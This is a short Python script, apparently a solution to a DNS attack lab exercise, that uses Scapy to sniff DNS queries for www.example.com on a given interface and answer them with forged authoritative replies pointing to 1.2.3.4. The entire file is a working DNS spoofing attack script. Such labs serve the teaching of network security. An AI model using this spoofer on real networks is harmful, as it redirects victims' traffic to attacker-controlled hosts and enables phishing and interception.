from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

ATTACKER_NS = "ns.attacker32.com"
ATTACKER_IFACE = "br-a09e48475a68"


class Task:
    @staticmethod
    def _1():

        TARGET = "www.example.com"

        def spoof_dns(pkt):
            if (
                pkt.haslayer(DNS)
                and pkt.haslayer(DNSQR)
                and TARGET in pkt[DNSQR].qname.decode("utf-8")
                and pkt[DNS].qr == 0
            ):
                print(f"Got DNS Query: {pkt[IP].summary()}")

                resp = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(
                            rrname=pkt[DNSQR].qname,
                            type="A",
                            rclass="IN",
                            ttl=30,
                            rdata="1.2.3.4",
                        ),
                    )
                )

                send(resp)

        _ = sniff(
            iface=ATTACKER_IFACE,
            prn=spoof_dns,
            filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
        )


if __name__ == "__main__":
    Task()._1()
